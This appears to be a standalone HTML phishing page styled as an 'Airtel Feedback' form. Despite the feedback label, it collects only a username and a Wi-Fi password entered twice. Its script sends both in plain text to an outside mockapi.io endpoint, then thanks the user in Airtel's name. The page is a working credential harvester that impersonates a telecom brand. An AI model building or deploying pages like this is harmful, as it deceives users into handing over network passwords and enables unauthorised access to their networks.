<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Airtel Feedback</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f9;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        .container {
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            max-width: 400px;
            width: 100%;
        }

        h1 {
            margin-bottom: 20px;
            font-size: 1.8rem;
            text-align: center;
        }

        .form-group {
            margin-bottom: 15px;
        }

        label {
            display: block;
            font-size: 0.9rem;
            margin-bottom: 5px;
            color: #333;
        }

        input {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 1rem;
        }

        input:focus {
            outline: none;
            border-color: #007BFF;
        }

        button {
            width: 100%;
            padding: 10px;
            border: none;
            border-radius: 5px;
            background-color: #007BFF;
            color: white;
            font-size: 1rem;
            cursor: pointer;
        }

        button:hover {
            background-color: #0056b3;
        }

        #thank-you {
            display: none;
            font-size: 1.5rem;
            text-align: center;
            margin-top: 20px;
            color: #28a745;
            font-weight: bold;
            animation: fadeIn 2s ease-out;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
            }

            to {
                opacity: 1;
            }
        }
    </style>
</head>

<body>
    <div class="container">
        <h1>Airtel Feedback</h1>
        <form id="wifi-feedback-form">
            <div class="form-group">
                <label for="username">Username</label>
                <input type="text" id="username" name="username" placeholder="Enter your username" required>
            </div>
            <div class="form-group">
                <label for="wifi-password">Wi-Fi Password</label>
                <input type="password" id="wifi-password" name="wifi-password" placeholder="Enter the Wi-Fi password" required>
            </div>
            <div class="form-group">
                <label for="wifi-password-confirm">Confirm Wi-Fi Password</label>
                <input type="password" id="wifi-password-confirm" name="wifi-password-confirm" placeholder="Confirm the Wi-Fi password" required>
            </div>
            <button type="submit">Submit</button>
        </form>
        <div id="thank-you">Thank you from Airtel!</div>
    </div>

    <script>
        document.getElementById('wifi-feedback-form').addEventListener('submit', async (e) => {
            e.preventDefault();

            const username = document.getElementById('username').value;
            const wifiPassword = document.getElementById('wifi-password').value;
            const wifiPasswordConfirm = document.getElementById('wifi-password-confirm').value;

            // Check if passwords match
            if (wifiPassword !== wifiPasswordConfirm) {
                alert("Passwords do not match! Please try again.");
                return;
            }

            const data = { username, wifiPassword };

            // Mock API URL (Replace with your actual Mock API endpoint)
            const apiUrl = 'https://676f066ab353db80c321e2ab.mockapi.io/AirtelFeedback';

            try {
                const response = await fetch(apiUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(data),
                });

                if (response.ok) {
                    // Show the Thank You message
                    document.getElementById('thank-you').style.display = 'block';

                    // Reset the form after submission
                    document.getElementById('wifi-feedback-form').reset();
                } else {
                    alert('Failed to submit feedback.');
                }
            } catch (error) {
                console.error('Error:', error);
                alert('An error occurred while submitting your feedback.');
            }
        });
    </script>
</body>

</html>
